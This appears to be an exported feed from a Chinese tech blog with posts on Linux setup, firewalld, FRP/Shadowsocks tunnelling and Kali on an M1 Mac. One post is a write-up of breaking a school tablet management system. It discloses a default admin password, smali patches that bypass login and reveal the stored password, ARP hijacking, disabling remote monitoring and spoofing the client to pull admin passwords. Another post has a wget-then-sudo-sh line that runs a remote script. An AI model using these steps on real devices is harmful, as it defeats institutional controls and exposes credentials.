class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -Syu haveged<br>systemctl start haveged<br>systemctl <span class="hljs-built_in">enable</span> haveged<br><span class="hljs-built_in">rm</span> -rf /etc/pacman.d/gnupg<br>sudo pacman-key --init<br>sudo pacman-key --populate archlinux<br>sudo pacman-key --populate archlinuxcn<br>sudo pacman -S archlinuxcn-keyring<br></code></pre></td></tr></table></figure><p>安装xorg：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pacman -S xorg xorg-server<br></code></pre></td></tr></table></figure><p>安装输入设备：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -S xf86-input-libinput<br>sudo pacman -S xf86-input-synaptics  <span class="hljs-comment">#触摸板驱动#</span><br></code></pre></td></tr></table></figure><p>安装登录管理器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -S sddm sddm-kcm<br>systemctl <span class="hljs-built_in">enable</span> sddm<br></code></pre></td></tr></table></figure><p>安装KDE：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -S plasma kde-applications<br></code></pre></td></tr></table></figure><p>安装声音管理器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -S alsa-utils pulseaudio pulseaudio-alsa<br></code></pre></td></tr></table></figure><p>安装完成后重启即可，效果图如下：</p><center><p><img src="https://cdn.starryloki.com/2023/11/85b83cdbc51f4ee86a36b36bc1b4881d.png" alt="Choose"></p></center><p>后续安装软件可能会用到Aur助手：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -S yay<br></code></pre></td></tr></table></figure><p>至此，Archlinux安装已经完成。<br>EOF</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS8下开启L2TP后Firewalld失效的解决方法</title>
      <link href="/2021/04/10/CentOS8%E4%B8%8B%E5%BC%80%E5%90%AFL2TP%E5%90%8EFirewalld%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2021/04/10/CentOS8%E4%B8%8B%E5%BC%80%E5%90%AFL2TP%E5%90%8EFirewalld%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近开始上数据库原理与应用，需要用到SQL，而我主要使用macOS进行日常操作。不同于Windows，macOS上搭建SQL Server需要借助docker，而macOS Arm版本的Docker仍属于测试版，有许多不稳定的因素，于是打算在我的服务器上部署ms-sqlserver。但是微软并未对Ubuntu 20.04发布ms-sqlserver对release，docker上的ms-sqlserver也有许多莫名其妙的bug，于是我计划将我的服务器迁移到CentOS 8上（49年入国军），顺便体验和学习CentOS。</p><p>迁移总体上很顺利，原来运行在Ubuntu上的Shadowsocks和L2TP服务端以及其他服务和环境都十分顺利的迁移到CentOS上了，ms-sqlserver也安装成功。但是后续的操作却出现了一些exception。</p><p>CentOS相比Ubuntu有一个很显著的区别是自带了防火墙，每安装一个服务都需要将对应的端口设为ACCEPT。但是在安装好L2TP服务后，我尝试在防火墙添加端口，却提示 <code>FirewallD is not running</code> 。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>CentOS 8.3.2011 x86_64</p><h2 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h2><p>既然Firewalld没有在运行，先看看这个服务的状态：</p><p><img src="https://cdn.starryloki.com/2023/11/f331ac2bf68732e1e8f1d4a60a78a0ec.png" alt="pic"></p><p>于是使用<code>systemctl unmask firewalld.service</code>  </p><p>再<code>systemctl start firewalld.service</code></p><p>发现服务成功启用，firewall-cmd指令也成功被执行，于是以为问题被解决。</p><p>后来发现系统重启之后，从学校内网无法正常使用L2TP服务器：能顺利连接并获得VPN内网IP，但是无法访问VPN IP外的其他地址，初步推测是转发环节出了问题。</p><p>我是使用<code>wget https://git.io/vpnsetup-centos -O vpn.sh &amp;&amp; sudo sh vpn.sh &amp;&amp; sudo bash /opt/src/ikev2.sh --auto</code>这个脚本一键部署l2TP&#x2F;IPSec服务，出了问题自然首先重新执行一次脚本，重新执行后发现L2TP连接回归正常，但是Firewalld又失效了，于是开始解析脚本。</p><p>在脚本中发现了相关操作</p><p><img src="https://cdn.starryloki.com/2023/11/23bfc7219b98b97b9e3b9abc81f0a8ba.png" alt="pic"></p><p><img src="https://cdn.starryloki.com/2023/11/2cb525c6fff9c8969eb96a34051325d0.png" alt="pic"></p><p><img src="https://cdn.starryloki.com/2023/11/f2f99274d1413d0125a6a2bb53424ea7.png" alt="pic"></p><p>不难发现脚本将相关的转发操作部署在nftables里面，然后将firewalld给mask了，而ntfables的操作比firewalld复杂得多，经过短时间的研究，大概了解到可以通过<br><code>nft insert rule inet firewalld filter_IN_public_allow &#123;protol&#125; dport &#123;port&#125; accept</code></p><p>或</p><p><code>nft insert rule inet firewalld filter_INPUT &#123;protol&#125; dport &#123;port&#125; accept</code></p><p>来将端口设置为ACCEPT，并通过</p><p><code>nft list ruleset inet</code></p><p>来查看已经开放的端口。</p><p>目前还不知道怎样通过firewalld来实现L2TP的转发，有知道的朋友欢迎在评论区留言。</p><p>EOF</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次解除某平板管理软件的限制</title>
      <link href="/2021/03/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%A7%A3%E9%99%A4%E6%9F%90%E5%B9%B3%E6%9D%BF%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%99%90%E5%88%B6/"/>
      <url>/2021/03/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%A7%A3%E9%99%A4%E6%9F%90%E5%B9%B3%E6%9D%BF%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大部分采用智慧课堂教学的学校都是用某平板管理软件进行对平板的管控，能实现限制网络连接，限制APP的安装，实时获取设备信息等。这里将会介绍解除平板管控的一些已经验证过可用的思路。这是一个两年半之前实施的项目,因为一些数据丢失的原因这里无法进行整个系统的环境复现，也没有太多成果截图，这里只能根据好友共享的系统镜像最大限度地还原当时的思路。</p><h2 id="环境概述"><a href="#环境概述" class="headerlink" title="环境概述"></a>环境概述</h2><p>拿到平板之后，简单的测试了一下，发现许多可以利用的点：</p><ul><li>平板采用高度定制的安卓7.1.1系统</li><li>平板使用验证APK包名的方法来判断是否属于白名单</li><li>平板的网络防火墙并未限制192.168.0.0&#x2F;16以及172.16.0.0&#x2F;16</li><li>虽然系统将USB设置为仅充电但是在系统开机加载时有短暂的几秒能使用ADB</li><li>Bootloader可被解锁</li><li>存在一个“管理员设置”并由密码保护，密码可能随云端更新</li><li>平板管理始终没有调用ROOT权限</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>为了更加透彻地了解这个系统，我利用短暂的ADB进入bootloader并解锁bootloader，然后刷入TWRP，将系统的镜像提取了出来，检视应用列表后发现，对平板的限制极有可能是由包名为<code>com.android.launcher3</code>的定制桌面操控，于是开始整活。</p><h2 id="解除过程"><a href="#解除过程" class="headerlink" title="解除过程"></a>解除过程</h2><h3 id="尝试卸载桌面"><a href="#尝试卸载桌面" class="headerlink" title="尝试卸载桌面"></a>尝试卸载桌面</h3><p>既然是有可能由桌面操控，那么卸载掉桌面极有可能会解除管控，对桌面使用dex2jar进行简单逆向，发现在设备从未联网时，管理员默认密码为<code>xunfei!!@</code>，于是在bootloader双清设备，启动系统，断网并进入管理员登录界面，输入默认密码成功进入管理员界面，管理员界面功能如下：</p><p><img src="https://cdn.starryloki.com/2023/07/e5dab2c125b9ddef957287c031d89cfd.png" alt="defupass"></p><center>源码中的默认密码</br></center><p><img src="https://cdn.starryloki.com/2023/07/49f7797c9e9f696427312d3a07f2898d.jpeg" alt="admin"></p><center>管理员设置界面</br></center><p>虽然那个解除限制十分诱人，但是后期的逆向发现这是对平板使用限制的解除而非App或TCP&#x2F;IP的限制。回到正题，我们打开usb连接电脑，并连接电脑，顺利进入adb调试界面，于是执行<code>adb uninstall com.android.launcher3</code>以及<code>adb install newdesk.apk</code>，完成后重启设备，由于其内置的部分App有内嵌Web访问以访问登录或重置密码的网页，我们可以使用ARP劫持使其强行访问我们指定的网站，测试结果发现卸载com.android.launcher3后，网址白名单已被解除，然而App的安装限制仍未解除，这更加印证了com.android.launcher3对平板的限制有着千丝万缕的联系。也意味着我们需要进行进一步的逆向。</p><p><img src="https://cdn.starryloki.com/2023/07/ed6cf66e75c0296f0b6e974e0ac99b74.jpeg" alt="baidu"></p><center>卸载桌面并使用ARP劫持后成功访问白名单外的网页</br></center><h3 id="攻破管理员登录"><a href="#攻破管理员登录" class="headerlink" title="攻破管理员登录"></a>攻破管理员登录</h3><p>从前面的研究结果来看，管理员界面是一个极为关键的跳板，如果能绕过管理员界面或得到密码将会对后面对操作有极大的帮助，于是开始审阅源码。在逆向出来的jar包里，很容易发现一个名为<code>LoginActivity</code>的类控制着管理员登录界面，得到了登录相关的方法</p><p><img src="https://cdn.starryloki.com/2023/07/8ad1e57252e94482baddff708ad4ba31.png" alt="login"></p><center>登录方法的Java源码</br></center><p>显然我们可以修改源文件以将“用户名且密码正确”的逻辑改成“用户名或密码正确”或者“用户名正确且密码错误”以达到输入任意值即可进入管理员界面。但是我们并不能直接编辑dex2jar得到的java文件，我们需要更深一层，通过对照java源代码去编辑Smali文件，好在Smali语言不算特别难理解，很快发现逻辑判断的地方，如图：</p><p><img src="https://cdn.starryloki.com/2023/07/d92a45a0315b9fb11d0cfa012af4c75b.png" alt="loginsmali"></p><center>判断逻辑的Smali代码解析</br></center><p>于是，我们可以把密码判断的if-eqz替换成if-nez，这样如果用户输入错误的密码就不跳转，进行登录成功的流程，不仅如此，我们可以更进一步，在line 104中调用sPFTool来读取管理员密码时插入一个弹窗，把密码值通过弹窗弹出来，在<code>move-result-object v1</code>后面插入如下代码：</p><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-built_in"></span><br><span class="hljs-built_in">const/4 </span>v5, 0x1<span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-static </span>&#123;p0, v1, v5&#125;, <span class="hljs-class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="hljs-class">Landroid/content/Context;</span><span class="hljs-class">Ljava/lang/CharSequence;</span>I)<span class="hljs-class">Landroid/widget/Toast;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v4<span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;v4&#125;, <span class="hljs-class">Landroid/widget/Toast;</span>-&gt;show()V<br><br></code></pre></td></tr></table></figure><p>即可在登录中程序调用密码时将密码弹出来，由于我使用的是早期版本的平板管理软件，密码直接以明文方式存储，十分方便进行hook，而后续版本则存储了密码的MD5，但是实验表明这段MD5并没有使用任何数据加salt，对其进行解密难度不是特别大。</p><h3 id="网址白名单的解除"><a href="#网址白名单的解除" class="headerlink" title="网址白名单的解除"></a>网址白名单的解除</h3><p>虽然管理员界面有方法添加网址白名单，但是只能一个一个网址地添加而且有被服务端配置覆盖的风险，自然不可取，而前文提到卸载平板管理软件后重启系统网址白名单即解除，那么可以推出在设备开机之后平板管理手动启动了网址白名单，至少有一个管理开机后的操作或者初始化的类包含了白名单的开关，于是我们继续逆向，发现一个叫“BootCheckReceiver”类操控着开机启动后的操作，在里面发现了相关方法，Java代码如下：</p><center><p><img src="https://cdn.starryloki.com/2023/07/29c93c85b6f746be6a8651c068d15046.png" alt="firewall"></p></center><p>这段代码十分好理解，读取配置如果为limit则启用防火墙，我们自然不会去修改可能被服务端覆盖的配置来达到效果，而enableFireWall前面名为“MDM”的类引起了我的注意，根据import的索引，我跳转到这个类，发现是一个根据设备型号进行类索引的“中枢”，而我手上的平板对应的类如下：</p><center><p><img src="https://cdn.starryloki.com/2023/07/490729cb65bf18f269cd0e8ddd9c40ae.png" alt="device"></p></center><p>于是我们前往这个类，发现许多有意思的方法，这里列举一部分：</p><center>![DDDD](https://cdn.starryloki.com/2023/07/41ad7df19172d0ed3b09620ea60659e8.png)DDDD</br></center><p>于是我们现在前往BootCheckReceiver对应的Smali文件，找到了对enableFirewall的调用：</p><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.line</span> 51<span class="hljs-built_in"></span><br><span class="hljs-built_in">sget-object </span>v1, <span class="hljs-class">Lcom/linspirer/rom/MDM;</span>-&gt;x:<span class="hljs-class">Lcom/linspirer/rom/IMDM;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-interface </span>&#123; v1 &#125;, <span class="hljs-class">Lcom/linspirer/rom/IMDM;</span>-&gt;enableFireWall()<br></code></pre></td></tr></table></figure><p>直接把enable修改成disable即可，至此，网络访问限制已被解除。</p><h3 id="MDM-x的第三方调用"><a href="#MDM-x的第三方调用" class="headerlink" title="MDM.x的第三方调用"></a>MDM.x的第三方调用</h3><p>我们已经大致了解了平板管控的原理，定制的系统提供API，平板管理软件通过MDM.x的方法与API对接，而在调用API时并未发现任何验证措施，如果我们自己写一个安卓APP，引入MDM相关的类和方法，是否也可以调用系统提供的API呢？</p><p>答案是肯定的，如果有安卓APP开发基础，我们可以直接将与MDM调用API有关联的类导入到自己的APP，做好索引后即可使用<code>MDM.x.</code>调用系统API；如果不会开发相关APP，我们可以在平板管理里找到一个有交互性且调用了MDM类的Activity，比如管理员设置。</p><p>我们可以直接前往管理员设置所对应的Smali文件，将已存在的方法调用替换成对MDM.x的调用，比如：</p><p><img src="https://cdn.starryloki.com/2023/07/4e34a777fe2853df604603f0d89cc5ef.png" alt="MDM"></p><center>管理员设置中的MDM调用</br></center><p>可以替换成enableSDCard之类的方法。</p><h3 id="应用白名单的解除"><a href="#应用白名单的解除" class="headerlink" title="应用白名单的解除"></a>应用白名单的解除</h3><p>虽然我从MDM的类中挖出了绝大部分的控制方法，但是遍历后并没有发现有解除app白名单方法，仅有写入或读取，由此可见这个公司还是比较保守，没有把如此关键的方法放出来，初步猜测这个方法位于PackageManagerService中但是目前没有办法逆向出来，于是逆向了framework里面的PackageInstaller和pm，并没有发现白名单的实现机制，于是只能从逻辑推测。</p><p>首先回顾一下系统逻辑，如果存在不在白名单内的非system应用，会被平板管理卸载掉，而平板管理和智慧课堂套件都不是system应用，并且在平板管理里面有一些方法将自身和智慧课堂套件写入白名单，于是可以推测当白名单为空的时候，应该不存在限制，否则当白名单为空时，平板管理等一系列附属APP将会被系统卸载，平板管理被卸载后就无法从云端读取新的白名单写入系统，平板就此报废。于是我在上面调用MDMAPI的app中新增了一个功能：利用<code>MDM.x.appWhiteListWrite()</code>写入一个空的名单，然后利用修改包名将这个APP改成白名单内存在的app，装入系统，运行方法，限制顺利被解除，之后进一步修改源码，将平板管理内所有调用<code>MDM.x.appWhiteListWrite()</code>的方法的赋值替换为空值，防止平板管理写入白名单导致限制被重新启用，至此应用白名单已被解除。</p><center>![APP](https://cdn.starryloki.com/2023/07/01fb66d54d1254ef80b6c2b58e0c08a4.png)把MDM相关的类导入到自己的APP就能直接调用了</br></center><h3 id="解除云端监控"><a href="#解除云端监控" class="headerlink" title="解除云端监控"></a>解除云端监控</h3><p>之前有一部分的平板出现系统故障，上报学校网管之后被后台远程重置，于是推测系统内有服务器远程操控的方法，于是继续阅读源码。在一个叫CommandManager.class的类里面找到了一个服务器发送命令让本地执行的方法，于是在Smali将命令改成服务器基本不会发送的字符串，这样就大致脱离了服务端对平板的控制。</p><center>![CMD](https://cdn.starryloki.com/2023/07/08beda2bf717723397eed6e64b0026e7.png)远程操控的相关类</br></center><p>顺着上传应用列表的方法，在其他类中找到了自动上传位置和应用列表的类，于是在Smali中将将要上传的返回值用空白变量劫持，这样就大致脱离了服务器对设备的监控。</p><h3 id="伪装成客户端从服务器爬数据"><a href="#伪装成客户端从服务器爬数据" class="headerlink" title="伪装成客户端从服务器爬数据"></a>伪装成客户端从服务器爬数据</h3><p>前文提到管理员密码等配置会随服务器更新，于是我找到了这个类，我们可以依照上面调用MDM.x的思路，在第三方APP引入这个类及其依赖的类，在输入schoolid等数据之后，即可直接获取管理员密码等关键信息。</p><p><img src="https://cdn.starryloki.com/2023/07/10a064446868fb5624750785c07d8180.png" alt="code1"><br><img src="https://cdn.starryloki.com/2023/07/d9a45e19206ddcedec93363f3aa91bee.png" alt="code2"></p><p><img src="https://cdn.starryloki.com/2023/07/34708bc00821bfde1b6c10dd4113471a.jpeg" alt="CMD"></p><center>解除限制后安装第三方APP以及使用DEX注入劫持背景图</br></center><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个逆向的项目还是非常简单的，目标系统简直是一个筛子。不过后期得到了许多“修复”：  </p><ul><li>密码采用MD5存储（源码中的初始密码仍然为明文）</li><li>对源码进行了混淆（源码中内置mapping且有未混淆版本源码做对照）</li><li>com.android.launcher3不可卸载（可以用pm disable禁用然后用破解版替代）</li></ul><center><p><img src="https://cdn.starryloki.com/2023/07/ab6620cfa1cfec18e727f7dc74e29f7b.png" alt="code1"></p></br></center><p>解除这类平板使用限制的方法还有很多，比如从万能的xda下载机型的官方系统包直接刷入等等，虽然十分简单粗暴，但是却少了许多逆向的乐趣。</p><p>EOF</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> Java </tag>
            
            <tag> Smali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用一条FRP隧道访问多个内网服务</title>
      <link href="/2021/02/22/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%9D%A1frp%E9%9A%A7%E9%81%93%E8%AE%BF%E9%97%AE%E5%A4%9A%E4%B8%AA%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1/"/>
      <url>/2021/02/22/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%9D%A1frp%E9%9A%A7%E9%81%93%E8%AE%BF%E9%97%AE%E5%A4%9A%E4%B8%AA%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="2022年更新："><a href="#2022年更新：" class="headerlink" title="2022年更新："></a>2022年更新：</h2><p>已经采用更灵活性能更强的三层隧道了。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然IPv6正在逐渐普及，可能会有助于用户获得公网IP，但是运营某学校校园网的电信并未打算为该校师生提供IPv6，公网IP更加无从说起，所以目前来说，FRP仍然是生活中非常常用且不可取代的。然而一些FRP服务商的免费服务中提供的隧道十分少，稳定的花生壳只提供了两条隧道，而SakuraFrp虽然提供了5条但是没有前者那么稳定，虽然2-5条隧道也不是不能用，但是对于RDP，SSH，web等一众服务来说是不够的，那么有没有办法仅用一条隧道就访问内网的多个服务呢？</p><span id="more"></span><p>答案是肯定的：我们可以在隧道搭建SOCKS5来实现。  </p><p>SOCKS5是一个代理协议，它在使用TCP&#x2F;IP协议通讯的前端机器和服务器机器之间扮演一个中介角色，使得内部网中的前端机器变得能够访问Internet网中的服务器，说白了就是当通过FRP连接到SOCKS5服务端后，客户端就相当于直接进入服务端所在的内网了。</p><h2 id="部署服务端"><a href="#部署服务端" class="headerlink" title="部署服务端"></a>部署服务端</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>系统：Ubuntu Server 20.04.2 LTS</p><h3 id="安装Shadowsocks服务端"><a href="#安装Shadowsocks服务端" class="headerlink" title="安装Shadowsocks服务端"></a>安装Shadowsocks服务端</h3><p>在Ubuntu下可以通过Nodejs快速部署Shadowsocks服务端，首先安装Nodejs和npm：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install nodejs npm<br></code></pre></td></tr></table></figure><p>安装pm2:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm -g i pm2<br></code></pre></td></tr></table></figure><p>安装shadowsocks：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm -g i shadowsocks<br></code></pre></td></tr></table></figure><p>此时应该会提示安装路径，如<code>/usr/local/lib/node_modules/shadowsocks/config.json</code></p><p>用Vim打开这个配置文件，如果这个文件是空的就写入如下信息：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;server&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;0.0.0.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;server_port&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">8083</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;local_address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;local_port&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1080</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;myPassword&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;timeout&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">600</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aes-256-cfb&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>易知访问端口为<code>8083</code>，密码为<code>myPassword</code>，算法为<code>aes-256-cfb</code>，<strong>此时应该设置一个能抵御社工的强密码，否则黑客将能轻易地通过简单密码进入内网！</strong></p><p>部署完成后，可以启动服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pm2 start /usr/local/lib/node_modules/shadowsocks/bin/ssserver<br></code></pre></td></tr></table></figure><p>但是这样部署并不能开机自启，我们可以通过systemd来实现：</p><p>首先新建一个服务并编辑：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo vim /etc/systemd/system/ss.service<br></code></pre></td></tr></table></figure><p>输入以下内容</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Shadowsocks Client Service <br><span class="hljs-attr">After</span>=network.target <br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">User</span>=Username<br><span class="hljs-attr">Type</span>=forking<br><span class="hljs-attr">ExecStart</span>=pm2 start /usr/local/lib/node_modules/shadowsocks/bin/ssserver<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>其中Username为用户名  </p><p>保存之后启用服务并启动：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> ss.service<br>sudo systemctl start ss.service<br></code></pre></td></tr></table></figure><p>重启并测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pm2 <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>如果出现shadowsocks的服务则部署成功</p><h3 id="部署FRP服务"><a href="#部署FRP服务" class="headerlink" title="部署FRP服务"></a>部署FRP服务</h3><p>部署的客户端及教程在各大服务商都有提供，安装好FRP服务后将本地端口指向上文配置文件中所配置的访问端口即可。值得一提的是，因为某些原因花生壳的SOCKS5隧道仅对付费用户开放，而我们使用内网穿透的场景多为TCP协议为主，所以我们可以新建一条TCP或UDP隧道（取决于实际需求）来指向shadowsocks的端口，SakuraFrp也类似，新建TCP&#x2F;UDP隧道即可。</p><center><p><img src="https://cdn.starryloki.com/2023/11/d89bea0e3ea21eb1613cd458b8e7e23c.png" alt="oray"></p></center><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="客户端环境"><a href="#客户端环境" class="headerlink" title="客户端环境"></a>客户端环境</h3><p>操作系统：iOS&#x2F;iPad OS 14.5，macOS Big Sur 11.2.1</p><h3 id="客户端部署"><a href="#客户端部署" class="headerlink" title="客户端部署"></a>客户端部署</h3><p>iOS在非国区商店都能下载Shadowrocket，支持直接在armMac上运行，Windows和安卓可以在各大使用ss协议的机场下载客户端，在客户端中填入FRP的公网地址和端口，密码和算法按照配置文件来填写，启动代理即连接内网。后续可以使用PAC进行进一步操作，这里不再阐述。</p><h2 id="设置HOSTS"><a href="#设置HOSTS" class="headerlink" title="设置HOSTS"></a>设置HOSTS</h2><p>在上述步骤完成后，虽然理论上已经进入内网，但是仍然无法通过原局域网IP连接对应主机，这时候我们需要在服务端设置hosts：在hosts中输入<code>内网IP 自定义域名（最好选择有代表性且不与广域网的域名重复）</code><br>如：</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini">192.168.1.1 a.com<br></code></pre></td></tr></table></figure><p>这时候我们在外网使用ss连接，通过a.com即可访问内网中192.168.1.1的主机。通过ping可以发现在SOCKS5的隧道中，各个内网主机的IP被分配了E类IP地址：240.0.0.0-255.255.255.254，而每次连接时各个主机的IP都不一样，目前也没有搞懂这个IP的分配机制，所以就先用hosts来指定IP。</p><center>![ping](https://cdn.starryloki.com/2023/11/f811c083ccd0a8eb3822681a630396c4.jpg)</br>在隧道中ping内网主机绑定的域名</center><p>EOF</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
            <tag> SOCKS5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在M1 Mac中安装Kali Linux</title>
      <link href="/2021/01/31/%E5%9C%A8M1-Mac%E4%B8%AD%E5%AE%89%E8%A3%85Kali-Linux/"/>
      <url>/2021/01/31/%E5%9C%A8M1-Mac%E4%B8%AD%E5%AE%89%E8%A3%85Kali-Linux/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然此前Parallels Desktop已经发布针对M1芯片的Preview，但是Kali官方并未提供适用于M1芯片的镜像，前者先前发布的ARM架构的Kali Linux多用于树莓派等设备，并不支持在M1和Parallels Desktop中运行，加上有迹象表明M1系列的引导从Boot Camp变成了iBoot，引导第三方系统的难度加大了，所以笔者将尝试从Docker安装Kali Linux。</p><span id="more"></span><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>设备：MacBook Air (M1,2020)<br>系统：macOS Big Sur 11.1<br>Docker：Docker Desktop Preview 7</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先下载M1版本的Docker Preview  </p><p><code>https://desktop.docker.com/mac/m1preview/Docker-AppleSilicon-Preview7.dmg</code></p><p>下载并安装好Docker后启动Docker并拉取Kali镜像  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker pull kalilinux/kali-rolling<br></code></pre></td></tr></table></figure><p>拉取完成后即可运行Kali容器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run --name kali -t -i kalilinux/kali-rolling /bin/bash<br></code></pre></td></tr></table></figure><p>这是一个类似WSL下的Kali，本身不包含任何工具，需要进行安装</p><p>首先更新apt和安装vim</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">apt update &amp;&amp; apt install vim<br></code></pre></td></tr></table></figure><p>将默认源换成清华源</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure><p>注释掉默认源，加入以下内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deb http://mirrors.tuna.tsinghua.edu.cn/kali/ kali-rolling contrib main non-free<br><br>deb-src http://mirrors.tuna.tsinghua.edu.cn/kali/ kali-rolling contrib main non-free<br></code></pre></td></tr></table></figure><p>安装Kali工具包</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">apt install kali-linux-default<br></code></pre></td></tr></table></figure><p>等待安装即可，大约6GB左右，期间会有多次输入确认。</p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><h3 id="PLATFROM"><a href="#PLATFROM" class="headerlink" title="PLATFROM"></a>PLATFROM</h3><p>通过输入<code>uname -m</code> 可以看到Docker内运行的是<code>x86_64</code>的Kali Linux,莫非在arm的架构下能模拟x86?</p><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p>从测试的结果来看，常用的nmap无法运行，原因不明，可以从arm的Homebrew下载macOS arm版的nmap进行替代</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">abrew install nmap<br></code></pre></td></tr></table></figure><p>笔者将arm版homebrew的环境变量设置成了abrew，所以是abrew install。</p><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>正常使用</p><p><img src="https://cdn.starryloki.com/2023/11/154b0d27c2a28a3bf3bf93cdff07205f.jpg" 